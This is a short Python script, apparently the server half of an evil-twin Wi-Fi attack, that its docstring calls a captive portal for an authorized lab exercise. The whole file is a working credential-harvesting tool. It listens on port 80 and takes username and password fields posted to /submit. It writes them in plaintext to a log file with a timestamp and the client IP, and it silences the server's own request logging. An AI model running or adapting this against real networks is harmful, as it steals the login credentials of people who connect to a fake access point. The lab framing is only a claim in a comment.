#!/usr/bin/env python3
"""Minimal captive portal used by ewave's authorized lab evil-twin exercise."""

import argparse
import json
import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

def clean(value):
    return value.replace("\t", " ").replace("\r", " ").replace("\n", " ")[:256]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--creds", required=True)
    args = parser.parse_args()
    try:
        fd = os.open(args.creds, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        os.close(fd)
        os.chmod(args.creds, 0o600)
    except OSError:
        pass
    class Handler(BaseHTTPRequestHandler):
        def send_json(self, value, status=200):
            body = json.dumps(value).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self.send_json({"service": "ewave-lab-portal", "status": "running"})

        def do_POST(self):
            if urlparse(self.path).path != "/submit":
                self.send_json({"error": "Unknown endpoint"}, 404)
                return
            try:
                length = int(self.headers.get("Content-Length", "0") or "0")
            except ValueError:
                length = 0
            body = self.rfile.read(min(max(length, 0), 65536)).decode("utf-8", "replace")
            form = parse_qs(body, keep_blank_values=True)
            username = clean((form.get("username") or [""])[0])
            password = clean((form.get("password") or [""])[0])
            client = clean(self.client_address[0])
            fd = os.open(args.creds, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
            with os.fdopen(fd, "a", encoding="utf-8") as log:
                log.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%dT%H:%M:%S"), client,
                                                username, password))
                log.flush()
            try:
                os.chmod(args.creds, 0o600)
            except OSError:
                pass
            self.send_json({"status": "recorded"})

        def log_message(self, fmt, *values):
            pass

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    server.serve_forever()


if __name__ == "__main__":
    main()
